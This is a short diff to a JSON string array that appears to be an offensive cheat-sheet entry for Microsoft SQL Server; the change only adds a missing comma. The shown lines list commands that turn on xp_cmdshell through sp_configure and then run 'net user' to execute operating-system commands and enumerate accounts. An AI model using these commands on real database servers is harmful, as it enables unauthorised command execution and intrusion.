@@ -14,7 +14,7 @@
 		"  `EXEC xp_cmdshell 'net user';`",
 		"  Note: If xp_cmdshell is disabled, enable it like so:",
 		"  `EXEC sp_configure 'show advanced options', 1;`",
-		"  `RECONFIGURE;`"
+		"  `RECONFIGURE;`",
 		"  `EXEC sp_configure 'xp_cmdshell', 1;`",
 		"  `RECONFIGURE;`"
 	]
